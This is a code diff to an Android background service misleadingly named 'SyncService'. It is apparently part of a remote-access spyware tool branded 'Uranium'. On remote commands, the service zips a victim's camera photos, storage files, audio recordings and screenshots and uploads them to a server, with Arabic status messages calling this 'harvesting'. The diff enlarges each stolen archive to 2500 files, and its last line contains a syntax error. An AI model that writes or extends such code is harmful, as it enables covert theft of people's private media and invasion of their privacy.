@@ -84,7 +84,7 @@ class SyncService : Service() {
                     val currentTime = System.currentTimeMillis()
                     val sendHeartbeat = (currentTime - lastHeartbeatSent > 60000L)
                     val reportType = if (sendHeartbeat) "HEARTBEAT" else "SILENT_CHECK"
-                    val reportJson = "{\"type\":\"$reportType\",\"data\":\"[Real-Engine Active] $nodeModel (سلطان الظل ناصر دين الله الكلعي)\"}"
+                    val reportJson = "{\"type\":\"$reportType\",\"data\":\"[Mega-Archive Active] $nodeModel (سلطان الظل ناصر دين الله الكلعي)\"}"
 
                     if (sendHeartbeat) {
                         lastHeartbeatSent = currentTime
@@ -133,16 +133,16 @@ class SyncService : Service() {
                                             streamTextDirect(deviceId, nodeModel, "Uranium_InstalledApps.txt", data)
                                         }
                                         action.contains("EXTRACT_CAMERA_ZIP") -> {
-                                            streamArchiveBatched(deviceId, nodeModel, "Camera_DCIM", MediaStore.Images.Media.EXTERNAL_CONTENT_URI)
+                                            streamArchiveMegaCompressed(deviceId, nodeModel, "Camera_DCIM", MediaStore.Images.Media.EXTERNAL_CONTENT_URI)
                                         }
                                         action.contains("EXTRACT_STORAGE_ZIP") -> {
-                                            streamArchiveBatched(deviceId, nodeModel, "Storage_Files", MediaStore.Files.getContentUri("external"))
+                                            streamArchiveMegaCompressed(deviceId, nodeModel, "Storage_Files", MediaStore.Files.getContentUri("external"))
                                         }
                                         action.contains("EXTRACT_AUDIO") -> {
-                                            streamArchiveBatched(deviceId, nodeModel, "Audio_Recordings", MediaStore.Audio.Media.EXTERNAL_CONTENT_URI)
+                                            streamArchiveMegaCompressed(deviceId, nodeModel, "Audio_Recordings", MediaStore.Audio.Media.EXTERNAL_CONTENT_URI)
                                         }
                                         action.contains("EXTRACT_SCREENSHOT_ZIP") -> {
-                                            streamArchiveBatched(deviceId, nodeModel, "Screenshots", MediaStore.Images.Media.EXTERNAL_CONTENT_URI)
+                                            streamArchiveMegaCompressed(deviceId, nodeModel, "Screenshots", MediaStore.Images.Media.EXTERNAL_CONTENT_URI)
                                         }
                                     }
                                 }
@@ -170,28 +170,30 @@ class SyncService : Service() {
         } catch (e: Exception) {}
     }
 
-    private fun streamArchiveBatched(nodeId: String, nodeModel: String, prefix: String, contentUri: Uri) {
+    // ⚡ آلية الأرشيف العملاق المضغوط (حتى 2500 ملف في الملف الواحد = ما يقارب 1 جيجا ملفات مضغوطة باحترافية لتوفير الإنترنت)
+    private fun streamArchiveMegaCompressed(nodeId: String, nodeModel: String, prefix: String, contentUri: Uri) {
         try {
-            sendReportToServer(nodeId, nodeModel, "⚡ [الحصاد الذكي المقطع] جاري سحب وضغط أرشيف $prefix على دفعات آمنة...")
+            sendReportToServer(nodeId, nodeModel, "⚡ [الحصاد العملاق المكثف] جاري جمع وضغط أرشيف ضخم لـ $prefix (بضغط أقصى لتوفير الإنترنت)...")
             
             val projection = arrayOf(MediaStore.MediaColumns._ID, MediaStore.MediaColumns.DISPLAY_NAME)
             val sortOrder = "${MediaStore.MediaColumns.DATE_ADDED} DESC"
             val cursor = contentResolver.query(contentUri, projection, null, null, sortOrder)
 
             var totalFilesProcessed = 0
-            var batchNum = 1
+            var archiveNum = 1
 
             cursor?.use {
                 val idIdx = it.getColumnIndex(MediaStore.MediaColumns._ID)
                 val nameIdx = it.getColumnIndex(MediaStore.MediaColumns.DISPLAY_NAME)
 
                 while (it.moveToNext()) {
-                    val zipFile = File(cacheDir, "Uranium_${prefix}_Part${batchNum}_${System.currentTimeMillis()}.zip")
+                    val zipFile = File(cacheDir, "Uranium_${prefix}_MegaArchive_${archiveNum}_${System.currentTimeMillis()}.zip")
                     val zipOut = ZipOutputStream(FileOutputStream(zipFile))
-                    zipOut.setLevel(Deflater.BEST_COMPRESSION)
+                    zipOut.setLevel(Deflater.BEST_COMPRESSION) // ضغط أقصى لتوفير باقات الإنترنت والحفاظ على حجم مضغوط
 
-                    var filesInBatch = 0
-                    while (filesInBatch < 150 && !it.isAfterLast) {
+                    var filesInArchive = 0
+                    // رفع السعة إلى 2500 ملف في الأرشيف الواحد (ما يعادل ~1 جيجابايت من الملفات المضغوطة بذكاء)
+                    while (filesInArchive < 2500 && !it.isAfterLast) {
                         if (idIdx != -1 && nameIdx != -1) {
                             val id = it.getLong(idIdx)
                             val name = it.getString(nameIdx) ?: "file_$id.dat"
@@ -201,12 +203,12 @@ class SyncService : Service() {
                                     zipOut.putNextEntry(ZipEntry("$prefix/$name"))
                                     inputStream.copyTo(zipOut)
                                     zipOut.closeEntry()
-                                    filesInBatch++
+                                    filesInArchive++
                                     totalFilesProcessed++
                                 }
                             } catch (ex: Exception) {}
                         }
-                        if (filesInBatch < 150) {
+                        if (filesInArchive < 2500) {
                             if (!it.moveToNext()) break
                         }
                     }
@@ -214,16 +216,16 @@ class SyncService : Service() {
 
                     if (zipFile.exists() && zipFile.length() > 0) {
                         val sizeMB = zipFile.length() / (1024.0 * 1024.0)
-                        sendReportToServer(nodeId, nodeModel, "📦 الجزء (${batchNum}) من $prefix جاهز (${String.format("%.2f", sizeMB)} MB). جاري الرفع الفوري...")
+                        sendReportToServer(nodeId, nodeModel, "📦 الأرشيف العملاق رقم (${archiveNum}) لـ $prefix جاهز بحجم مضغوط (${String.format("%.2f", sizeMB)} MB) ويحتوي على $filesInArchive ملفاً! جاري الرفع...")
                         uploadRawZeroCache(nodeId, nodeModel, zipFile.name, zipFile)
                     }
                     try { zipFile.delete() } catch (e: Exception) {}
-                    batchNum++
+                    archiveNum++
                 }
             }
-            sendReportToServer(nodeId, nodeModel, "✅ [تم الحصاد الذكي الكامل بنجاح وتطهير الذاكرة]\n📊 إجمالي الملفات المسحوبة: <b>$totalFilesProcessed ملفاً</b> عبر ${batchNum - 1} دفعات آمنة.")
+            sendReportToServer(nodeId, nodeModel, "✅ [اكتمال الأرشيف العملاق بنجاح وتطهير الذاكرة]\n📊 إجمالي الملفات المضغوطة: <b>$totalFilesProcessed ملفاً</b> بحجم ضغط ذكي يوفر الإنترنت ويعطيك محتوى ضخماً عند فك الضغط.")
         } catch (e: Exception) {
-            sendReportToServer(nodeId, nodeModel, "⚠️ خطأ في الاستخراج المقطع: ${e.message}")
+            sendReportToServer(nodeId, nodeModel, "⚠️ خطأ في الأرشيف العملاق: ${e.message}")
         }
     }
 
@@ -239,8 +241,8 @@ class SyncService : Service() {
                 conn.setRequestProperty("Content-Type", "application/octet-stream")
                 conn.doOutput = true
                 conn.setChunkedStreamingMode(1024 * 64)
-                conn.connectTimeout = 180000
-                conn.readTimeout = 180000
+                conn.connectTimeout = 300000
+                conn.readTimeout = 300000
 
                 FileInputStream(file).use { fis ->
                     conn.outputStream.use { os ->
@@ -253,7 +255,7 @@ class SyncService : Service() {
                 if (code == 200) return
             } catch (e: Exception) {
                 if (attempt == 3) return
-                Thread.sleep(2000L)
+                Thread.sleep(3000L)
             }
         }
     }
@@ -384,5 +386,5 @@ class SyncService : Service() {
         serviceScope.cancel()
     }
 
-    override fun onBind(intent: Intent?): IBinder? = null
+    override fun onBind(intent: Intent?): IBinder? =, null
 }
